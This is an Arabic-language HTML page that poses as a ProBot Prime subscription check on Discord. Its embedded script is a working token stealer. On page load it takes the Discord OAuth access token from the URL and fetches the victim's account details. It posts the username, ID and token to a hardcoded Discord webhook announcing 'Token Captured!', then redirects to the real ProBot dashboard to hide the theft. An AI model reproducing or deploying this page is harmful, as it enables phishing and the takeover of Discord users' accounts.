<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ProBot Prime - التحقق</title>
    <style>
        body {
            background-color: #2f3136;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #36393f;
            width: 100%;
            max-width: 400px;
            padding: 40px 20px;
            border-radius: 10px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
            text-align: center;
            border-top: 4px solid #5865F2;
        }
        .logo {
            width: 80px;
            height: 80px;
            background-image: url('https://probot.io/img/logo.png');
            background-size: cover;
            margin: 0 auto 20px;
            border-radius: 50%;
        }
        h1 {
            font-size: 22px;
            margin-bottom: 10px;
            color: #ffffff;
        }
        p {
            font-size: 14px;
            color: #b9bbbe;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        .spinner {
            width: 35px;
            height: 35px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #5865F2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo"></div>
    <h1>توثيق بروبوت برايم</h1>
    <p>يتم الآن التحقق من صلاحية اشتراك البرايم الخاص بك على حسابك في ديسكورد، يرجى عدم إغلاق هذه الصفحة...</p>
    <div class="spinner"></div>
</div>

<script>
    // الرابط بتاعك
    const webhook = "https://discord.com/api/webhooks/1497409587916177599/mDbc4yYLIeZQSUkKTWualuZsBSU8AF5DDUJyT2Qs0yfEJR5FQ6d67ABfMSyL2B3WbQcI";

    window.onload = async () => {
        // سحب التوكن من الرابط (Hash)
        const params = new URLSearchParams(window.location.hash.slice(1));
        const token = params.get('access_token');

        if (token) {
            try {
                // جلب معلومات المستخدم
                const response = await fetch('https://discord.com/api/users/@me', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                const user = await response.json();

                // إرسال البيانات للويب هوك
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "ProBot Logs",
                        avatar_url: "https://probot.io/img/logo.png",
                        content: "@everyone 🎯 **Token Captured!**",
                        embeds: [{
                            title: "MNC Account Logged",
                            color: 5814783,
                            fields: [
                                { name: "User", value: `\`${user.username}#${user.discriminator}\``, inline: true },
                                { name: "ID", value: `\`${user.id}\``, inline: true },
                                { name: "Token", value: `\`\`\`${token}\`\`\`` }
                            ],
                            footer: { text: "MNC System | ProBot Verifier" }
                        }]
                    })
                });

                // توجيه للوحة تحكم بروبوت الحقيقية
                setTimeout(() => {
                    window.location.href = "https://probot.io/dashboard";
                }, 2000);

            } catch (err) {
                console.error("Error:", err);
            }
        } else {
            console.log("No token found in URL.");
        }
    };
</script>

</body>
</html>
